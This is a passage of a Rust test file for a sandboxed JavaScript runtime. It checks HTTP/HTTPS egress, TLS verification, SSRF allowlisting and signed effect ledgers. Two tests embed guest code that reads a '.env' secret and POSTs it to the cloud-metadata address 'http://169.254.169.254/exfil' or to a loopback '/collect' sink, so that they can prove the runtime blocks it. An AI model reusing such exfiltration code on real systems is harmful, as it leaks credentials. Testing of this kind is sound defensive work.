        .with_no_client_auth()
        .with_single_cert(vec![cert_der], key_der)
        .expect("server certificate");
    let server_config = Arc::new(server_config);

    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback TLS sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (tcp, _peer) = listener.accept().expect("accept guest egress");
        tcp.set_read_timeout(Some(Duration::from_secs(5)))
            .expect("read timeout");
        let conn = rustls::ServerConnection::new(server_config).expect("server connection");
        let mut tls = rustls::StreamOwned::new(conn, tcp);
        // Read the decrypted request up to the header terminator (bodyless GET).
        let mut received = Vec::new();
        let mut buf = [0u8; 1024];
        loop {
            match tls.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    received.extend_from_slice(&buf[..n]);
                    if received.windows(4).any(|w| w == b"\r\n\r\n") {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
        let _ = tls.write_all(
            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
        );
        let _ = tls.flush();
        tls.conn.send_close_notify();
        let _ = tls.flush();
        received
    });

    // An idiomatic guest program performing a single HTTPS GET.
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let source = format!("require('https').get('https://{addr}/');\n");
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    // The operator trusts the test anchor via the config seam (ADDED to the
    // webpki roots) and allowlists the loopback sink through the SSRF gate.
    let roots_path = temp_dir.path().join("extra-roots.pem");
    std::fs::write(&roots_path, cert_pem).expect("write extra TLS roots PEM");
    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config.security.network_policy.tls_extra_roots_pem_path =
        Some(roots_path.to_string_lossy().into_owned());
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "e2e: permit the loopback TLS test sink".to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("native run with an allowlisted https egress should succeed");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);

    // The framed request reached the listener THROUGH the TLS session: these
    // are decrypted bytes, so a plaintext egress (or a failed handshake) could
    // never produce them.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "the TLS sink must observe the decrypted engine-framed GET, got {wire:?}"
    );
    assert!(
        wire.contains(&format!("Host: {addr}\r\n")),
        "the framed request must carry the Host header for {addr}, got {wire:?}"
    );

    // The signed host-effect ledger surfaces the TLS egress as an `http_request`.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native https run must surface a host-effect ledger");
    assert_eq!(ledger.schema_version, "host-effect-ledger-v3.0");
    assert_eq!(
        ledger.effect_count, 1,
        "expected a single http_request effect, got {:?}",
        ledger.entries
    );
    assert_eq!(ledger.allowed_count, 1);
    assert_eq!(ledger.denied_count, 0);
    assert_eq!(
        ledger.entries[0].receipt.effect_kind.label(),
        "http_request",
        "the TLS egress must be recorded as an http_request effect"
    );

    // An external auditor re-derives the chain offline with the public SDK.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-https-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the https effect chain offline");
    assert_eq!(verdict.effect_count, 1);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

/// bd-3894s slice (5): an https egress whose server anchor is NOT trusted
/// (no `tls_extra_roots_pem_path`, self-signed peer) fails certificate
/// verification inside the network mechanism — fail-closed. The run still
/// completes and the signed ledger records the attempt honestly: the effect's
/// SSRF authorization succeeded (allowlisted endpoint) but the round trip
/// errored, so no forged "response" ever reaches the guest and no plaintext
/// fallback occurs (the sink observes zero decrypted request bytes).
#[test]
#[cfg(feature = "engine")]
fn run_https_untrusted_anchor_fails_closed_bd_3894s() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    let certified = rcgen::generate_simple_self_signed(vec!["127.0.0.1".to_string()])
        .expect("generate self-signed certificate");
    let cert_der = certified.cert.der().clone();
    let key_der = rustls_pki_types::PrivateKeyDer::Pkcs8(certified.key_pair.serialize_der().into());
    let tls_provider = Arc::new(rustls::crypto::ring::default_provider());
    let server_config = rustls::ServerConfig::builder_with_provider(tls_provider)
        .with_safe_default_protocol_versions()
        .expect("server protocol versions")
        .with_no_client_auth()
        .with_single_cert(vec![cert_der], key_der)
        .expect("server certificate");
    let server_config = Arc::new(server_config);

    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback TLS sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (tcp, _peer) = listener.accept().expect("accept guest egress");
        tcp.set_read_timeout(Some(Duration::from_secs(5)))
            .expect("read timeout");
        let conn = rustls::ServerConnection::new(server_config).expect("server connection");
        let mut tls = rustls::StreamOwned::new(conn, tcp);
        // The client must abort the handshake (untrusted anchor); any read
        // error or clean close yields zero decrypted request bytes.
        let mut received = Vec::new();
        let mut buf = [0u8; 1024];
        loop {
            match tls.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    received.extend_from_slice(&buf[..n]);
                    if received.windows(4).any(|w| w == b"\r\n\r\n") {
                        break;
                    }
                }
            }
        }
        let _ = tls.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok");
        let _ = tls.flush();
        received
    });

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let source = format!("require('https').get('https://{addr}/');\n");
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    // Allowlist the endpoint (SSRF authorizes it) but deliberately do NOT
    // install the anchor: certificate verification is the layer under test.
    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "e2e: SSRF-authorize the sink; TLS verification must still fail".to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("the run completes; the failed TLS effect is recorded, not fatal");

    assert_eq!(report.runtime, "franken_engine");

    // No decrypted request bytes ever reached the peer.
    let received = server.join().expect("server thread");
    assert!(
        received.is_empty(),
        "certificate verification failure must abort before any request bytes cross, got {:?}",
        String::from_utf8_lossy(&received)
    );

    // The ledger records the attempt honestly: a single fail-closed receipt,
    // nothing allowed, no fabricated response.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native https run must surface a host-effect ledger");
    assert_eq!(
        ledger.allowed_count, 0,
        "a failed TLS handshake must not be recorded as an allowed effect: {:?}",
        ledger.entries
    );
    assert_eq!(
        ledger.denied_count, 1,
        "the failed TLS egress must surface as a fail-closed receipt: {:?}",
        ledger.entries
    );
    assert_eq!(
        ledger.entries[0].receipt.effect_kind.label(),
        "http_request"
    );
}

/// bd-3894s slice (2b) (http leg, mock-free e2e — writable ClientRequest body): a
/// real JS program that builds an HTTP request body INCREMENTALLY via the writable
/// `ClientRequest` stream —
/// `const req = http.request(url, { method: 'POST', ... }); req.write(a);
/// req.write(b); req.end(c);` — run through the PUBLIC `run --json` path. The
/// `http.request` call lowers to the engine's `net:client_request` HostCall (it
/// builds the ClientRequest object WITHOUT egressing); the egress fires only on
/// `req.end()`, carrying the body ACCUMULATED across the `write`/`end` calls. The
/// framed POST really reaches a loopback listener with the assembled body, and the
/// signed host-effect ledger surfaces the egress as an allowed `http_request`
/// effect (the same proof-carrying path as the immediate `http.get` form, so the
/// body lands in the ledger with identical fidelity — a POST-with-body built via
/// `req.write` is no longer dropped or recorded as a benign GET).
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_signed_http_request_write_end_body_ledger_bd_3894s() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // A loopback listener that accepts one connection, reads the framed request to
    // EOF (the half-closed request half), then replies and closes so the guest's
    // response read terminates (the slice-4 single-socket round trip).
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok");
        let _ = stream.flush();
        received
    });

    // An idiomatic guest program that streams the request body: `http.request`
    // returns a writable ClientRequest, `req.write` appends each chunk, and
    // `req.end` sends the assembled body. The lowering routes `http.request` to
    // `net:client_request` (deferred egress), so nothing is sent until `req.end()`.
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let source = format!(
        "const http = require('http');\n\
         const req = http.request('http://{addr}/submit', {{ method: 'POST', headers: {{ 'Content-Type': 'text/plain' }} }});\n\
         req.write('Hello, ');\n\
         req.write('world');\n\
         req.end('!');\n"
    );
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    // legacy-risky grants network_egress (authorizing the `net:client_request`
    // creation AND the deferred `.end()` egress at the engine capability layer);
    // the operator allowlists the loopback sink so the product-layer SSRF gate
    // authorizes this exact endpoint.
    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "e2e: permit the loopback test sink".to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("native run with an allowlisted http.request write/end egress should succeed");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);

    // The framed POST with the ACCUMULATED body really reached the loopback sink —
    // the load-bearing proof the writable-stream body was assembled and sent.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("POST /submit HTTP/1.1\r\n"),
        "the loopback sink must observe the engine-framed POST request, got {wire:?}"
    );
    assert!(
        wire.contains("Content-Type: text/plain\r\n"),
        "the request headers must be framed onto the wire, got {wire:?}"
    );
    assert!(
        wire.contains("Content-Length: 13\r\n"),
        "the assembled write/end body length (\"Hello, world!\") must be framed, got {wire:?}"
    );
    assert!(
        wire.ends_with("\r\n\r\nHello, world!"),
        "the body assembled across req.write/req.end must follow the blank-line terminator, got {wire:?}"
    );

    // The signed host-effect ledger surfaces the egress as an allowed http_request.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native http.request write/end run must surface a host-effect ledger");
    assert_eq!(
        ledger.effect_count, 1,
        "expected a single http_request effect from req.end(), got {:?}",
        ledger.entries
    );
    assert_eq!(ledger.allowed_count, 1);
    assert_eq!(ledger.denied_count, 0);
    assert_eq!(
        ledger.entries[0].receipt.effect_kind.label(),
        "http_request",
        "the deferred req.end() egress must be recorded as an http_request effect"
    );

    // An external auditor re-derives the chain offline from the ledger entries.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-clientrequest-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the http effect chain offline");
    assert_eq!(verdict.effect_count, 1);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

/// bd-plhag (information-flow labeling on the run path): a real guest reads a
/// recognized secret-bearing file (`.env`) and tries to POST its contents to
/// the cloud-metadata endpoint. The product-layer SSRF gate denies that
/// endpoint before any socket opens, so the egress is a DENIED receipt — and
/// because its (framed) payload contains the secret bytes read earlier, the
/// signed ledger records it as a flow BLOCK (`flow_policy_verdict = blocked`)
/// carrying the secret's `label_set_commitment`. The verifier SDK then proves
/// OFFLINE, with zero trust in this runtime, that the forbidden label was
/// blocked before reaching the sink — a real non-exfiltration guarantee.
#[test]
#[cfg(feature = "engine")]
fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
    use frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    // A real secret-bearing file, long enough to clear the min-sample bound.
    std::fs::write(
        temp_dir.path().join(".env"),
        "SECRET_TOKEN=plhag-flow-e2e-do-not-exfiltrate-abcdef0123456789\n",
    )
    .expect("write .env fixture secret");
    // The guest reads the secret then POSTs it to the cloud-metadata endpoint.
    let source = "const fs = require('fs');\n\
         const secret = fs.readFileSync('.env', 'utf8');\n\
         const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
         req.on('error', () => {});\n\
         req.end(secret);\n";
    let app_path = create_test_app(temp_dir.path(), "app.js", source);

    // legacy-risky grants fs + network_egress at the engine capability layer;
    // the DEFAULT network policy (Block, no allowlist) denies the cloud-metadata
    // endpoint at the product-layer SSRF gate before any socket opens.
    let config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("handled policy denial must complete with signed effect evidence");
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("handled denied secret egress must surface its effect ledger");
    let secret_commitment = secret_file_label_set_commitment();

    // The sensitive read is labeled (a source), but a read is not a sink.
    let read = ledger
        .entries
        .iter()
        .find(|e| e.receipt.effect_kind.label() == "fs_read")
        .unwrap_or_else(|| panic!("ledger omitted the .env fs_read receipt: {ledger:#?}"));
    assert_eq!(
        read.receipt.label_set_commitment, secret_commitment,
        "the secret-file read must carry the secret label commitment"
    );
    assert_eq!(read.receipt.flow_policy_verdict.label(), "label_clean");

    // The denied egress carrying the secret is a flow BLOCK.
    let egress = ledger
        .entries
        .iter()
        .find(|e| e.receipt.effect_kind.label() == "http_request")
        .unwrap_or_else(|| panic!("ledger omitted the denied http_request: {ledger:#?}"));
    assert!(
        matches!(
            egress.receipt.policy_outcome,
            frankenengine_node::runtime::effect_receipt::PolicyOutcome::Denied { .. }
        ),
        "the cloud-metadata endpoint must be SSRF-denied"
    );
    assert_eq!(
        egress.receipt.flow_policy_verdict.label(),
        "blocked",
        "a denied egress carrying the secret is a flow block"
    );
    assert_eq!(egress.receipt.label_set_commitment, secret_commitment);
    assert!(ledger.denied_count >= 1);

    // OFFLINE proof: the verifier SDK re-derives the chain and proves the
    // forbidden label was blocked before the sink.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json).expect("verifier SDK accepts the ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-plhag-blocked");
    let chain = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the effect chain offline");
    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
        forbidden_label_set_commitments: vec![secret_commitment.clone()],
        external_sink_effect_kinds: vec!["http_request".to_string()],
        allowed_declassification_refs: vec![],
    };
    let non_exfil =
        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
    let http_proof = non_exfil
        .examined_effects
        .iter()
        .find(|e| e.effect_kind == "http_request")
        .expect("an examined http_request effect");
    assert_eq!(
        http_proof.proof_outcome, "blocked_before_sink",
        "the SDK must classify the blocked secret egress as blocked_before_sink"
    );
}

/// bd-n1bym (PREVENTION at an allowed sink): the same secret read, but the
/// guest POSTs it to an operator-allowlisted loopback endpoint the SSRF gate
/// PERMITS. The information-flow gate — wrapped OUTSIDE the SSRF gate — refuses
/// the egress before any socket opens because its bytes carry the secret this
/// run read. The leak never physically happens: the loopback listener receives
/// no connection, the ledger records a DENIED flow-blocked egress, and the
/// verifier SDK proves "blocked_before_sink". (Under bd-plhag alone this same
/// scenario leaked and was only DETECTED after the fact; bd-n1bym converts the
/// detection into prevention.)
#[test]
#[cfg(feature = "engine")]
fn run_blocks_secret_egress_to_allowed_sink_bd_n1bym() {
    use frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment;
    use std::io::ErrorKind;
    use std::net::TcpListener;

    // A loopback sink at an allowlisted address. The flow gate denies pre-socket,
    // so NOTHING should ever connect — the listener is non-blocking and we assert
    // no connection arrived (the physical proof the secret never left).
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    listener
        .set_nonblocking(true)
        .expect("non-blocking listener");
    let addr = listener.local_addr().expect("listener addr");

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    std::fs::write(
        temp_dir.path().join(".env"),
        "SECRET_TOKEN=plhag-flow-e2e-do-not-exfiltrate-abcdef0123456789\n",
    )
    .expect("write .env fixture secret");
    let source = format!(
        "const fs = require('fs');\n\
         const secret = fs.readFileSync('.env', 'utf8');\n\
         const req = require('http').request('http://{addr}/collect', {{ method: 'POST' }});\n\
         req.on('error', () => {{}});\n\
         req.end(secret);\n"
    );
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "bd-n1bym e2e: SSRF allows loopback; the flow gate must still block"
                .to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("handled flow denial must complete with signed effect evidence");

    // Physical proof the secret never left: no connection reached the sink.
    match listener.accept() {
        Err(err) if err.kind() == ErrorKind::WouldBlock => {}
        other => {
            panic!("the flow gate must prevent the egress; the sink saw a connection: {other:?}")
        }
    }

    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("handled flow-blocked egress must surface its effect ledger");
    let secret_commitment = secret_file_label_set_commitment();
    let egress = ledger
        .entries
        .iter()
        .find(|e| e.receipt.effect_kind.label() == "http_request")
        .unwrap_or_else(|| panic!("ledger omitted the flow-blocked http_request: {ledger:#?}"));
    assert!(
        matches!(
            egress.receipt.policy_outcome,
            frankenengine_node::runtime::effect_receipt::PolicyOutcome::Denied { .. }
        ),
        "the flow gate must DENY the secret egress even though SSRF allows the endpoint"
    );
    assert_eq!(
        egress.receipt.flow_policy_verdict.label(),
        "blocked",
        "the prevented secret egress is a flow block"
    );
    assert_eq!(egress.receipt.label_set_commitment, secret_commitment);
    assert!(ledger.denied_count >= 1);

    // The verifier SDK proves OFFLINE that the secret was blocked before the sink.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json).expect("verifier SDK accepts the ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-n1bym-prevent");
    let chain = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the effect chain offline");
    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
        forbidden_label_set_commitments: vec![secret_commitment],
        external_sink_effect_kinds: vec!["http_request".to_string()],
        allowed_declassification_refs: vec![],
    };
    let non_exfil =
        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
    assert!(
        non_exfil
            .examined_effects
            .iter()
            .any(|e| e.effect_kind == "http_request" && e.proof_outcome == "blocked_before_sink"),
        "the SDK must classify the flow-blocked secret egress as blocked_before_sink"
    );
}

/// bd-3894s slice (2c) (http leg, mock-free e2e — response callback delivery): a
/// real, idiomatic JS program that uses the Node response-callback form —
/// `http.get(url, (res) => { ... })` — run through the PUBLIC `run --json` path.
/// The `http.get` egress fires synchronously and the response callback is delivered
/// `cb(res)` on the next event-loop turn (the engine drains the macrotask queue
/// after the program's synchronous portion). The callback EXECUTING with the REAL
/// parsed response is proven mock-free: it gates on `res.status === 200` and writes
/// `res.body` (the bytes the loopback server actually returned) to the sandbox —
/// so the file only exists, with the server's body, if the callback ran and saw the
/// genuine response. The signed host-effect ledger carries BOTH effects: the
/// `http_request` egress (the program's main turn) AND the `fs_write` the callback
/// performed (the event-loop turn), proving the callback's own effect is
/// proof-carrying too. No mocks: real parser/lowering of `http.get(url, cb)`,
/// real SSRF-gated egress + round trip, real callback execution, real fs write.
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_signed_http_get_response_callback_ledger_bd_3894s() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // A loopback listener that accepts one connection, reads the half-closed request
    // to EOF, then replies with a distinctive body and closes so the guest's
    // response read terminates (the slice-4 single-socket round trip). The body the
    // callback writes back to disk proves it received THIS response.
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nserved-ok");
        let _ = stream.flush();
        received
    });

    // The guest program registers a response callback. It gates on the parsed
    // status (`res.status === 200`) and writes the parsed body (`res.body`) to the
    // sandbox — so the file is the load-bearing proof the callback both RAN and saw
    // the real response. `http.get(url, cb)` lowers to `net:request` carrying the
    // trailing closure; the engine delivers `cb(res)` on the next event-loop turn.
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let source = format!(
        "const http = require('http');\n\
         http.get('http://{addr}/', (res) => {{\n\
         \x20 if (res.status === 200) {{\n\
         \x20   require('fs').writeFileSync('cb_out.txt', res.body);\n\
         \x20 }}\n\
         }});\n"
    );
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    // legacy-risky grants network_egress (the http.get egress) AND fs_write (the
    // callback's writeFileSync); the operator allowlists the loopback sink so the
    // product-layer SSRF gate authorizes this exact endpoint.
    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "e2e: permit the loopback test sink".to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("native run with an http.get response callback should succeed");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);

    // The egress crossed the socket as a real GET.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "the loopback sink must observe the engine-framed GET request, got {wire:?}"
    );

    // THE LOAD-BEARING PROOF: the response callback executed on the event-loop turn
    // with the REAL parsed response — it only writes when `res.status === 200`, and
    // it writes `res.body`, so the file holds exactly the server's reply body.
    assert_eq!(
        std::fs::read(temp_dir.path().join("cb_out.txt"))
            .expect("the response callback must have written cb_out.txt"),
        b"served-ok",
        "the callback ran with the real response: it gated on res.status === 200 and wrote res.body"
    );

    // The signed host-effect ledger carries BOTH the egress and the callback's own
    // fs write — proof the response-callback path is proof-carrying end to end.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native http.get callback run must surface a host-effect ledger");
    assert_eq!(
        ledger.effect_count, 2,
        "expected the http_request egress + the callback's fs_write, got {:?}",
        ledger.entries
    );
    assert_eq!(ledger.allowed_count, 2);
    assert_eq!(ledger.denied_count, 0);
    let kinds: Vec<&str> = ledger
        .entries
        .iter()
        .map(|entry| entry.receipt.effect_kind.label())
        .collect();
    assert_eq!(
        kinds,
        vec!["http_request", "fs_write"],
        "the egress (main turn) precedes the callback's fs write (event-loop turn)"
    );

    // An external auditor re-derives the whole chain offline from the ledger entries.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-http-callback-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the http + fs effect chain offline");
    assert_eq!(verdict.effect_count, 2);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

/// bd-3894s slice (2d) (http leg, mock-free e2e — IncomingMessage readable-stream
/// EVENT model): a real, idiomatic JS program that consumes the response through the
/// Node readable-stream events — `res.on('data', chunk => …)` then `res.on('end',
/// () => …)` — registered INSIDE the `http.get(url, (res) => { … })` response
/// callback, run through the PUBLIC `run --json` path. This is the proof the event
/// model is real end to end:
///   - `http.get(url, cb)` lowers to `net:request` carrying the trailing closure; the
///     engine delivers `cb(res)` on the next event-loop turn (slice 2c);
///   - inside that callback the program registers `res.on('data', …)` and
///     `res.on('end', …)` on the `IncomingMessage` (slice 2d `.on` via the `__type`
///     tag);
///   - on the FOLLOWING turns the engine emits `'data'` with the whole body as one
///     chunk (the listener accumulates it) and then `'end'` (the listener writes the
///     accumulated buffer to the sandbox).
///
/// The file therefore exists, with the server's body, ONLY if the listeners were
/// registered AND fired in data→end order with the real response bytes — no synchronous
/// `res.body` shortcut is used. The signed host-effect ledger carries BOTH the
/// `http_request` egress and the `fs_write` the `'end'` listener performed, and the
/// verifier SDK re-derives the chain offline. No mocks: real parser/lowering, real
/// SSRF-gated egress + round trip, real event-emitter dispatch, real fs write.
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_signed_http_get_response_event_stream_ledger_bd_3894s() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // A loopback listener that accepts one connection, reads the half-closed request
    // to EOF, then replies with a distinctive body and closes so the guest's response
    // read terminates (the slice-4 single-socket round trip). The body the 'end'
    // listener writes back to disk proves the readable stream delivered THIS response.
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nserved-ok");
        let _ = stream.flush();
        received
    });

    // The guest program registers readable-stream listeners on the response and only
    // writes on 'end', from a buffer ACCUMULATED across 'data' events — so the file is
    // load-bearing proof that 'data' delivered the real body chunk and 'end' fired
    // after it, with the listeners registered inside the response callback.
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let source = format!(
        "const http = require('http');\n\
         http.get('http://{addr}/', (res) => {{\n\
         \x20 let body = '';\n\
         \x20 res.on('data', (chunk) => {{ body += chunk; }});\n\
         \x20 res.on('end', () => {{\n\
         \x20   require('fs').writeFileSync('cb_out.txt', body);\n\
         \x20 }});\n\
         }});\n"
    );
    let app_path = create_test_app(temp_dir.path(), "app.js", &source);

    // legacy-risky grants network_egress (the http.get egress) AND fs_write (the
    // 'end' listener's writeFileSync); the operator allowlists the loopback sink so
    // the product-layer SSRF gate authorizes this exact endpoint.
    let mut config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };
    config
        .security
        .network_policy
        .allowlist
        .push(NetworkAllowlistEntry {
            host: "127.0.0.1".to_string(),
            port: None,
            reason: "e2e: permit the loopback test sink".to_string(),
        });

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
        .expect("native run with http response stream events should succeed");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);

    // The egress crossed the socket as a real GET.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "the loopback sink must observe the engine-framed GET request, got {wire:?}"
    );

    // THE LOAD-BEARING PROOF: the 'end' listener wrote the buffer accumulated from the
    // 'data' event(s), so the file holds exactly the server's reply body — which is
    // only true if res.on('data') delivered the real chunk and res.on('end') fired
    // after it, both registered inside the response callback.
    assert_eq!(
        std::fs::read(temp_dir.path().join("cb_out.txt"))
            .expect("the 'end' listener must have written cb_out.txt"),
        b"served-ok",
        "data→end fired in order: 'data' delivered res body, 'end' wrote the accumulated buffer"
    );

    // The signed host-effect ledger carries BOTH the egress and the 'end' listener's
